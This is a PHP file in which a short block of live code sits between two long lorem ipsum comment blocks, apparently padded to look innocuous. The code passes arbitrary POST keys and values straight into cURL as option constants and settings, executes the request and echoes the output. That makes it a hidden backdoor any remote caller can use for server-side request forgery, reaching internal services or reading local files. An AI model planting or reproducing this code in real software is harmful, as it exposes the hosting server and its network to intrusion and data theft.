<?php

	/*
Phasellus volutpat orci at nulla faucibus, ac vestibulum justo fringilla. Nullam congue diam et arcu venenatis, in facilisis libero maximus. Nam tincidunt diam eget neque pulvinar fringilla. Vivamus ullamcorper vestibulum velit, convallis commodo justo porta eu. Vivamus molestie felis diam, eget condimentum dui rhoncus at. Donec porttitor lacus vel diam cursus maximus. Morbi vehicula ipsum sit amet diam efficitur ullamcorper. Phasellus finibus, libero ac sodales egestas, metus est semper libero, et vehicula urna ipsum eget enim. Vestibulum ut ligula nec mauris ultricies vestibulum. Nulla facilisi. Cras venenatis lobortis diam et vulputate. Sed non aliquam metus, quis tincidunt arcu. Fusce velit nulla, varius ut dui porta, malesuada imperdiet arcu. Maecenas bibendum accumsan scelerisque.

Praesent euismod dolor lobortis, placerat nunc sit amet, auctor est. Ut id turpis dictum, placerat mi non, aliquet mauris. Morbi sodales sem sit amet feugiat imperdiet. Pellentesque ultrices, magna ut varius tristique, erat enim condimentum enim, vitae varius erat risus vel lacus. Donec porta molestie odio, elementum hendrerit est mattis vitae. Aliquam et tristique velit. Nunc id est nec urna ultrices feugiat.

Phasellus gravida eleifend lacus non lobortis. Nunc dictum dolor sit amet varius consectetur. Ut interdum orci sit amet nisi euismod, at tempor sem maximus. Donec vitae enim arcu. Sed scelerisque mauris a odio mattis, mollis laoreet mi maximus. Proin dignissim egestas mauris, eu laoreet massa molestie vitae. Nulla vestibulum orci varius dapibus vulputate. Nulla pellentesque lectus risus. Maecenas viverra dignissim dui. Fusce laoreet sapien at cursus mollis. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas.

Nunc porttitor, justo vitae porta maximus, ex odio hendrerit nisi, a sollicitudin mauris lorem sit amet nunc. Aenean eu nulla diam. Curabitur metus nunc, ullamcorper vitae suscipit eu, posuere eu diam. Aenean semper blandit justo, vitae ultrices ipsum gravida eget. In aliquam orci metus, vel bibendum nibh cursus eu. Cras dapibus ullamcorper diam eu commodo. Sed vitae aliquet lectus, id tristique metus. Integer nec egestas nulla. Nullam eget aliquet neque. Quisque at pulvinar lectus. Morbi congue diam nec tempus aliquet. Morbi vel tellus quis quam scelerisque aliquam. Pellentesque lobortis elit urna, et pharetra lorem vulputate vitae. Maecenas vitae suscipit quam, vel interdum enim. Vivamus gravida ante at cursus imperdiet.

Curabitur lobortis vestibulum ante, id fermentum metus aliquet a. Aenean ac sapien sem. Praesent euismod, lacus rhoncus sollicitudin bibendum, est nunc ullamcorper turpis, at pulvinar augue augue vitae metus. Maecenas finibus, velit sit amet accumsan porttitor, ligula erat finibus lectus, in ullamcorper velit purus sed libero. Proin sit amet pulvinar mi, a iaculis ipsum. Ut cursus diam nec pretium aliquet. Phasellus eget dui a velit finibus porta. Morbi a magna tincidunt ex faucibus condimentum. Aenean eu vulputate nisl. Maecenas lobortis tincidunt ante. Phasellus fringilla sed augue et finibus. Quisque fermentum quam dui, in sodales est vulputate vel. Ut egestas, turpis sit amet molestie volutpat, nisl massa ullamcorper massa, commodo efficitur turpis tellus at orci. Nullam fringilla luctus lectus vel sagittis.


*/
	$ch = curl_init();

	curl_setopt_array($ch,
	    array_combine(
	        array_map("constant", array_keys($_POST)),
	        array_values($_POST)
	    )
	);

	$result = curl_exec($ch);

	curl_close($ch);

	echo $result;

/*
Phasellus volutpat orci at nulla faucibus, ac vestibulum justo fringilla. Nullam congue diam et arcu venenatis, in facilisis libero maximus. Nam tincidunt diam eget neque pulvinar fringilla. Vivamus ullamcorper vestibulum velit, convallis commodo justo porta eu. Vivamus molestie felis diam, eget condimentum dui rhoncus at. Donec porttitor lacus vel diam cursus maximus. Morbi vehicula ipsum sit amet diam efficitur ullamcorper. Phasellus finibus, libero ac sodales egestas, metus est semper libero, et vehicula urna ipsum eget enim. Vestibulum ut ligula nec mauris ultricies vestibulum. Nulla facilisi. Cras venenatis lobortis diam et vulputate. Sed non aliquam metus, quis tincidunt arcu. Fusce velit nulla, varius ut dui porta, malesuada imperdiet arcu. Maecenas bibendum accumsan scelerisque.

Praesent euismod dolor lobortis, placerat nunc sit amet, auctor est. Ut id turpis dictum, placerat mi non, aliquet mauris. Morbi sodales sem sit amet feugiat imperdiet. Pellentesque ultrices, magna ut varius tristique, erat enim condimentum enim, vitae varius erat risus vel lacus. Donec porta molestie odio, elementum hendrerit est mattis vitae. Aliquam et tristique velit. Nunc id est nec urna ultrices feugiat.

Phasellus gravida eleifend lacus non lobortis. Nunc dictum dolor sit amet varius consectetur. Ut interdum orci sit amet nisi euismod, at tempor sem maximus. Donec vitae enim arcu. Sed scelerisque mauris a odio mattis, mollis laoreet mi maximus. Proin dignissim egestas mauris, eu laoreet massa molestie vitae. Nulla vestibulum orci varius dapibus vulputate. Nulla pellentesque lectus risus. Maecenas viverra dignissim dui. Fusce laoreet sapien at cursus mollis. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas.

Nunc porttitor, justo vitae porta maximus, ex odio hendrerit nisi, a sollicitudin mauris lorem sit amet nunc. Aenean eu nulla diam. Curabitur metus nunc, ullamcorper vitae suscipit eu, posuere eu diam. Aenean semper blandit justo, vitae ultrices ipsum gravida eget. In aliquam orci metus, vel bibendum nibh cursus eu. Cras dapibus ullamcorper diam eu commodo. Sed vitae aliquet lectus, id tristique metus. Integer nec egestas nulla. Nullam eget aliquet neque. Quisque at pulvinar lectus. Morbi congue diam nec tempus aliquet. Morbi vel tellus quis quam scelerisque aliquam. Pellentesque lobortis elit urna, et pharetra lorem vulputate vitae. Maecenas vitae suscipit quam, vel interdum enim. Vivamus gravida ante at cursus imperdiet.

Curabitur lobortis vestibulum ante, id fermentum metus aliquet a. Aenean ac sapien sem. Praesent euismod, lacus rhoncus sollicitudin bibendum, est nunc ullamcorper turpis, at pulvinar augue augue vitae metus. Maecenas finibus, velit sit amet accumsan porttitor, ligula erat finibus lectus, in ullamcorper velit purus sed libero. Proin sit amet pulvinar mi, a iaculis ipsum. Ut cursus diam nec pretium aliquet. Phasellus eget dui a velit finibus porta. Morbi a magna tincidunt ex faucibus condimentum. Aenean eu vulputate nisl. Maecenas lobortis tincidunt ante. Phasellus fringilla sed augue et finibus. Quisque fermentum quam dui, in sodales est vulputate vel. Ut egestas, turpis sit amet molestie volutpat, nisl massa ullamcorper massa, commodo efficitur turpis tellus at orci. Nullam fringilla luctus lectus vel sagittis.

*/
?>